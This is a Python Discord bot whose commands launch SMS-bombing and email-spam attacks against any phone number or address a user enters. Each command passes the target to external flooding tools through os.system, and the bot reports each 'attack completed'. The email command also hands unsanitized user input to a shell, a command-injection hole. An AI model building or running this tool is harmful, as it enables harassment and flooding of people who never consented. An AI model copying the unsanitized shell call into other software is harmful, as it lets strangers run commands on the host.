import discord
from discord.ext import commands
from monda import SI
import datetime
import os
import time
import re

bot = commands.Bot(command_prefix='*', description="Test bot")
# Event
@bot.event
async def on_ready():
   await bot.change_presence(activity=discord.Game(name="*info"))
   print("\033[4;35m"+"bot on")


@bot.command()
async def info(ctx):
   embed3 = discord.Embed(title ="""commands:

EMAIL: *email test@test.com

SMS: *sms +573221243431""", color=0x00ff00)
   await ctx.send(embed=embed3)


@bot.command()
async def sms(ctx,arg):

	validate = re.findall("\+?[\d]{10,14}", arg)
	if not validate:
		embed10 = discord.Embed(title ="you didn't pass with a +, or is not a number, or did you pass it with spaces, example: *sms +22123456789", color=0x00ff01)
		await ctx.send(embed=embed10)
		return
	#print(validate[0])
	embed = discord.Embed(title ="the sms attack takes between takes 2 minutes", color=0x00ff00, timestamp=datetime.datetime.utcnow())
	await ctx.send(embed=embed)
	os.system(f"cd quack ; python3 quack --tool SMS --target  {validate[0]} --threads 60 --timeout 90")	
	embed2 = discord.Embed(title ="sms attack completed! :skull:" ,color=0x00ff00,timestamp=datetime.datetime.utcnow())
	await ctx.send(embed=embed2)

@bot.command()
async def email(ctx,arg):
    embed4 = discord.Embed(title ="Email spam sent! takes 1 minute and 30 seconds", color=000000)
    await ctx.send(embed=embed4)
    os.system(f"python3 impulse.py --method EMAIL --time 90 --target {arg}")
    embed5 = discord.Embed(title ="Email atack completed!", color=0x00ff00, timestamp=datetime.datetime.utcnow())
    await ctx.send(embed=embed5)


bot.run(SI)
